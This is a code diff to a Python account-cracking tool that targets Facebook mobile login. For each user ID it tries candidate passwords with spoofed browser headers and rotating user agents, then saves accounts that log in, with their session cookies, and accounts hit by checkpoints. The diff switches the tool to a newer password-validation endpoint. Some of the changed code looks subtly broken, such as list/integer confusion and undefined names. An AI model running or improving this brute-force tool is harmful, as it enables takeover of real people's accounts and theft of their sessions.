@@ -441,31 +441,80 @@ class crack:
 		for pw in peweh:
 			try: 
 				ses = requests.Session()
-				uas = UA()
-				ses.headers.update({"Host": url_log,"cache-control": "max-age=0","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-				p = ses.get(f"https://{url_log}/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2F{url_log}%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1652642384163%26e2e%3D%257B%2522init%2522%253A1652642384163%257D%26ies%3D1%26sdk%3Dandroid-9.0.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e9412d-fd80-4f3a-adc5-4c0e7ea71df3%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
+				uas = random.choice(keparat)
+				uas2 = random.choice(bajingan)
+				ses.headers.update({
+				"Host": url_log,
+				"cache-control": "max-age=0",
+				"user-agent": uas,
+				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',
+				"sec-ch-ua-mobile": "?1",
+				"sec-fetch-site": "none",
+				"sec-fetch-mode": "cors",
+				"sec-fetch-dest": "empty",
+				"sec-fetch-user": "?1",
+				"upgrade-insecure-requests": "1",
+				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+				})
+				p = ses.get(f"https://{url_log}/login/device-based/password/?uid="+user+"&flow=login_no_pin&refsrc=deprecated&_rdr")
+				lsd = re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
+				jazoest = re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
 				dataa ={
-					"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
-					"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
-					"email":user, 
-					"flow": "login_no_pin", 
-					"pass":pw,
-				}
+							"lsd":lsd,
+							"jazoest": jazoest,
+							"uid":user,
+							"next": f"https://{url_log}/login/save-device/",
+							"flow":"login_no_pin",
+							"encpass": f"#PWD_BROWSER:5:{str(random.randint(0000000000,9999999999))}:{pw}",
+							"first_prefill_source":"browser_dropdown",
+							"first_prefill_type":"contact_point",
+							"had_cp_prefilled":"true",
+							"had_password_prefilled":"true",
+							"is_smart_lock":"false",
+							"prefill_contact_point":user,
+							"prefill_source":"browser_dropdown",
+							"prefill_type":"password",
+							"try_number": "0",
+							"unrecognized_tries": "0"}
 				koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 				koki+=' m_pixel_ratio=2.625; wd=412x756'
-				headerx={"Host": url_log,"connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://"+url_log,"content-type": "application/x-www-form-urlencoded","user-agent": uas,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": f"https://{url_log}/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2F{url_log}%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1652642384163%26e2e%3D%257B%2522init%2522%253A1652642384163%257D%26ies%3D1%26sdk%3Dandroid-9.0.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e9412d-fd80-4f3a-adc5-4c0e7ea71df3%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-				po = ses.post(f'https://{url_log}/login/device-based/regular/login/?api_key=2036793259884297&auth_token=3cef90256fbcb9cbfe87b20fc6a1c7a8&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv9.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1652642384163%26e2e%3D%257B%2522init%2522%253A1652642384163%257D%26ies%3D1%26sdk%3Dandroid-9.0.0%26sso%3Dchrome_custom_tab%26scope%3Dpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D74e9412d-fd80-4f3a-adc5-4c0e7ea71df3%26tp%3Dunspecified&refsrc=deprecated&app_id=2036793259884297&cancel=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252274e9412d-fd80-4f3a-adc5-4c0e7ea71df3%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522j2kclu0k205afiiu3rnq%2522%257D&lwv=100&locale2=id_ID&refid=9',data=dataa,cookies={'cookie': koki},headers=headerx,allow_redirects=False)
+				headerx={
+				"Host": url_log,
+				"connection": "keep-alive",
+				"cache-control": "max-age=0",
+				"save-data": "on",
+				"origin": "https://"+url_log,
+				"content-type": "application/x-www-form-urlencoded",
+				"user-agent": uas2,
+				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				"x-requested-with": "XMLHttpRequest",
+				"dnt": "1",
+				"sec-ch-ua": '" Not A;Brand";v="24", "Chromium";v="107"',
+				"sec-ch-ua-platform": '"Linux"',
+				"sec-ch-ua-mobile": "?1",
+				"sec-fetch-site": "same-origin",
+				"sec-fetch-mode": "navigate",
+				"sec-fetch-dest": "document",
+				"sec-fetch-user": "empty",
+				"upgrade-insecure-requests": "1",
+				"referer": f"https://{url_log}/login/device-based/password/?uid="+user+"&flow=login_no_pin&refsrc=deprecated&_rdr",
+				"accept-encoding": "gzip, deflate",
+				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+				po = ses.post(f'https://{url_log}/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=headerx,allow_redirects=False)
 				if "c_user" in ses.cookies.get_dict():
 					romz = ses.cookies.get_dict()
 					kukis = ";".join([key+"="+value for key, value in romz.items()])
 					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n ')
-					ok.append(f"{user} ◊ {pw} ◊ {kukis} ")
-					open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {kukis} \n")
+					ok.append(user+'◊'+pw+'◊'+kukis+'\n')
+					ok+=1
+					open('OK/'+okc,'a').write(user+'◊'+pw+'◊'+kukis+'\n')
 					break
 				elif 'checkpoint' in ses.cookies.get_dict():
 					print (f'\r{P}└── {K}{user} ◊ {pw}  \n ')
-					cp.append(f'{user} ◊ {pw}')
-					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
+					cp.append(user+'◊'+pw)
+					cp+=1
+					open('CP/'+cpc,'a').write(user+'◊'+pw+'\n')
 					break
 				else:
 					continue
